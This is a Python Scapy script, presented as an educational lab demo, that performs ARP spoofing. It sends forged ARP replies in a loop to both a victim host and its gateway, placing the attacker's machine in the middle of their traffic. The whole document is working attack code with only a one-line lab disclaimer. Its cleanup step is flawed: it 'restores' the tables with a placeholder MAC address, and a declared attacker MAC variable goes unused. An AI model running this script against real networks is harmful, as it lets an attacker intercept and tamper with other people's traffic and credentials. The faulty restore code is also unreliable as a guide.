# ARP Spoofing / MITM Demo
# ------------------------
# Educational use only! Run in controlled lab/test VMs.
from scapy.all import ARP, Ether, send
import time

# Change these values to match your test lab setup
victim_ip = "192.168.1.5"     # Victim machine
gateway_ip = "192.168.1.1"    # Router/Gateway
attacker_mac = "00:0c:29:aa:bb:cc"  # Replace with attacker MAC

# Create spoofed ARP packet to trick victim
def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

try:
    print("=== Starting ARP Spoofing (MITM) Demo ===")
    while True:
        # Tell victim that "I am gateway"
        arp_spoof(victim_ip, gateway_ip)
        # Tell gateway that "I am victim"
        arp_spoof(gateway_ip, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRestoring ARP tables...")

    # Send correct ARP replies to restore
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc="aa:bb:cc:dd:ee:ff"), count=5)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc="aa:bb:cc:dd:ee:ff"), count=5)
    print("ARP tables restored. Exiting.")
